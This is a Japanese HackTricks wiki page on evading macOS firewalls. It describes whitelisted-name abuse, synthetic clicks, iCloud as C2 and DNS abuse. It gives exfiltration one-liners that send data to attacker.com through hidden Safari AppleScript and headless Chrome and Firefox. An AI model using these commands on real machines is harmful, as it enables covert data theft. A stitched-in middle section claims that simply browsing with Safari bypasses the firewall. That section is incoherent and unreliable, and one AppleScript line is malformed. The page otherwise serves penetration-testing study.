# macOS ファイアウォールの回避方法

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## 発見された技術

以下の技術は、一部のmacOSファイアウォールアプリで動作することが確認されました。

### ホワイトリスト名の悪用

* 例えば、マルウェアを**`launchd`**などのよく知られたmacOSプロセスの名前で呼び出す

### シンセティッククリック

* ファイアウォールがユーザーに許可を求める場合、マルウェアが**許可をクリック**する

### **Appleの署名済みバイナリの使用**

* **`curl`**のようなものだけでなく、**`whois`**なども含まれます

### よく知られたAppleのドメイン

ファイアウォールは、**`apple.com`**や**`icloud.com`**などのよく知られたAppleのドメインへの接続を許可している場合があります。そしてiCloudはC2として使用される可能性があります。

### 一般的なバイパス

ファイアウォールをバイパスするためのいくつかのアイデア

### 許可されたトラフィックの確認

許可されたトラフィックを知ることで、ホワイトリストに登録されている可能性のあるドメインや、それらにアクセスできるアプリケーションを特定することができます
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNSの悪用

DNSの解決は、おそらくDNSサーバーに接続することが許可されるであろう**`mdnsreponder`**という署名済みアプリケーションを介して行われます。

<figure><img src="../../.gitbook/assets/image (1) (1) (6).png" alt=""><figcaption></figcaption></figure>

### ブラウザアプリを介して

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* Google Chrome

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
# macOS ファイアウォールのバイパス

macOS には、ネットワークセキュリティを強化するための組み込みのファイアウォールがあります。しかし、ハッカーはこのファイアウォールを回避する方法を見つけることがあります。このセクションでは、macOS ファイアウォールをバイパスするためのいくつかのテクニックを紹介します。

## Safari の使用

Safari は macOS のデフォルトのウェブブラウザであり、ファイアウォールをバイパスするための有用なツールとなり得ます。Safari を使用すると、ファイアウォールの制限を回避して、ネットワーク上のリソースにアクセスすることができます。

以下に、Safari を使用してファイアウォールをバイパスする方法を示します。

1. Safari を開きます。
2. アドレスバーにアクセスしたいウェブサイトの URL を入力します。
3. Enter キーを押してウェブサイトにアクセスします。

Safari は、macOS ファイアウォールの制限を回避するために、ネットワークトラフィックを通過させることができます。これにより、ファイアウォールによってブロックされることなく、ウェブサイトやリソースにアクセスすることができます。

ただし、Safari を使用してファイアウォールをバイパスする場合でも、セキュリティには十分な注意を払う必要があります。ファイアウォールの制限を回避することは、セキュリティリスクを伴う可能性があるため、慎重に行う必要があります。

以上が、Safari を使用して macOS ファイアウォールをバイパスする方法です。
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### プロセスインジェクションを介して

もし、**任意のサーバーに接続できるプロセスにコードをインジェクション**できれば、ファイアウォールの保護を回避することができます:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## 参考文献

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** HackTricksで**会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
